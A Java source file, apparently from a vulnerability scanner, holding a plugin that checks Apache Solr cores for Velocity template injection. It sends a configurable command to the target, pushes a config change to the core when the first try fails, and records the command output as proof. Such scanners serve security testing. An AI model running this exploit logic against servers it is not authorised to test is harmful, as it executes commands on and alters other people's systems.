package com.gbw.scanner.plugins.scripts.web.solr.velocity;

import com.gbw.scanner.Host;
import com.gbw.scanner.plugins.scripts.web.solr.GBWScanSolrScript;
import com.gbw.scanner.plugins.scripts.web.solr.GBWScanSolrScriptConfig;
import com.gbw.scanner.plugins.scripts.web.solr.SolrCoreAdmin;
import com.gbw.scanner.plugins.scripts.web.solr.SolrHttpRequestBuilder;
import com.gbw.scanner.sink.SinkQueue;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

public class GBWScanSolrVelocityScript extends GBWScanSolrScript {

    private static final Logger log = LoggerFactory.getLogger(GBWScanSolrVelocityScript.class);

    public GBWScanSolrVelocityScript(GBWScanSolrScriptConfig config) {
        super(config);
    }

    @Override
    public boolean isAccept(Host host) {
        return true;
    }


    public String runPoc(HttpClient httpClient,Host host,String core){

        HttpResponse httpResponse;
        HttpRequest httpRequest = SolrHttpRequestBuilder.makeSolrCoreAttackRequest(host.getServer(),host.getPort(),core,config.getCmd(),true,config.getConTimeout());
        try {

            httpResponse = httpClient.send(httpRequest, HttpResponse.BodyHandlers.ofString());
            if(httpResponse.statusCode() == 200){
                /*is ok*/
                return (String)httpResponse.body();
            }else {

                /*try to config and try again*/
                httpRequest = SolrHttpRequestBuilder.makeSolrCoreConfigPostRequest(host.getServer(),host.getPort(),core,config.getConTimeout());
                httpResponse = httpClient.send(httpRequest, HttpResponse.BodyHandlers.ofString());
                httpRequest = SolrHttpRequestBuilder.makeSolrCoreAttackRequest(host.getServer(),host.getPort(),core,config.getCmd(),config.isEncode(),config.getConTimeout());
                httpResponse = httpClient.send(httpRequest, HttpResponse.BodyHandlers.ofString());
                if(httpResponse.statusCode() == 200)
                    return (String)httpResponse.body();
            }
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }

        return null;
    }

    public void processResult(SinkQueue sinkQueue,Host host,SolrCoreAdmin solrCoreAdmin,String result,String core){

        int len = result.length();
        if(len<config.getResultLenMax()) {
            GBWScanSolrVelocityScriptResult scriptResult = new GBWScanSolrVelocityScriptResult(config, host, result, solrCoreAdmin,core);
            sinkQueue.put(scriptResult);
            log.warn(String.format("Find a solr velocity template inject bugs in Host:%s:%d", host.getServer(), host.getPort()));
        }
    }

}
